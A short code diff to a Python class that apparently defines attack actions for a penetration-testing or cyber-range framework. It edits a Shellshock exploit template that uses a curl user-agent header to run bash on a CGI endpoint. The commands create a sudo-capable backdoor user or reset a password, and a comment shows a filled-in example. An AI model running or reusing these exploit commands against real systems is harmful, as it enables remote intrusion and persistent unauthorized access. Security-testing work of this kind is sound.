@@ -87,9 +87,12 @@ class ShellActions:
         """
         id = ActionId.SHELLSHOCK_EXPLOIT
         #curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'sudo useradd -rm -d /home/sambate -s /bin/bash -g root -G sudo -p $(openssl passwd -1 \'sambatestpw\') sambate'" http://172.18.7.31:80/cgi-bin/vulnerable
-        cmd = ["curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c "
+        cmd = ["curl -H \"user-agent: () {{ :; }}; echo; echo; /bin/bash -c "
                "'sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo "
-               "-p $(openssl passwd -1 \'{}\') {}'\" http://{}:80/cgi-bin/vulnerable"]
+               "-p $(openssl passwd -1 \'{}\') {}'\" http://{}:80/cgi-bin/vulnerable",
+               "curl -H \"user-agent: () {{ :; }}; echo; echo; /bin/bash -c 'echo {}:{} | sudo /usr/sbin/chpasswd'\" "
+               "http://{}:80/cgi-bin/vulnerable"
+               ]
         return Action(id=id, name="ShellShock Explolit", cmd=cmd,
                       type=ActionType.EXPLOIT,
                       descr="Uses the Shellshock exploit and curl to do remote code execution and create a backdoor",
